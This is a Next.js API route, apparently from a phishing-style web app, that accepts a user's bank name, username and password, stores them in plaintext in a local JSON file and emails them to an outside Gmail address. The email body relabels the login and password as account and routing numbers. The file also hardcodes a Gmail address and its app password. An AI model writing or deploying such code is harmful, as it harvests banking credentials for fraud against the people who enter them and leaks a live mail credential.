// pages/api/add-account.js

import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';

// Define the file path where bank account details will be stored
const dataFilePath = path.join(process.cwd(), 'data', 'accounts.json');

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { bankName, bankUsername, bankPassword } = req.body;

    if (!bankName || !bankUsername || !bankPassword) {
      return res.status(400).json({ message: 'All fields are required' });
    }

    try {
      // Save data locally
      saveAccountDetailsLocally({ bankName, bankUsername, bankPassword });

      // Send email notification
      await sendEmailNotification(bankName, bankUsername, bankPassword);

      return res.status(200).json({ message: 'Account added successfully!' });
    } catch (error) {
      console.error('Error:', error);
      return res.status(500).json({ message: 'Failed to add account' });
    }
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}

// Function to save account details to a JSON file
function saveAccountDetailsLocally(accountData) {
  // Read the existing data from the file
  fs.readFile(dataFilePath, 'utf8', (err, existingData) => {
    if (err && err.code !== 'ENOENT') {
      console.error('Error reading data file:', err);
      return;
    }

    let accounts = [];
    if (existingData) {
      accounts = JSON.parse(existingData);
    }

    // Append new account data with a timestamp
    accounts.push({ ...accountData, timestamp: new Date().toISOString() });

    // Write the updated data back to the file
    fs.writeFile(dataFilePath, JSON.stringify(accounts, null, 2), (err) => {
      if (err) {
        console.error('Error writing to data file:', err);
      } else {
        console.log('Account details saved successfully!');
      }
    });
  });
}

// Function to send an email notification
async function sendEmailNotification(bankName, bankUsername, bankPassword) {
  // Set up the email transporter using nodemailer
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'adesiyantope2014@gmail.com',
      pass: 'copl stcv wixx waaj',
    },
  });

  const mailOptions = {
    from: 'adesiyantope2014@gmail.com',
    to: 'devsusan24@gmail.com',
    subject: 'New Bank Account Added',
    text: `A new bank account has been added:
    - Bank Name: ${bankName}
    - Bank Account Number: ${bankUsername}
    - Bank Routing Number: ${bankPassword}`,
  };

  // Send the email
  await transporter.sendMail(mailOptions);
}
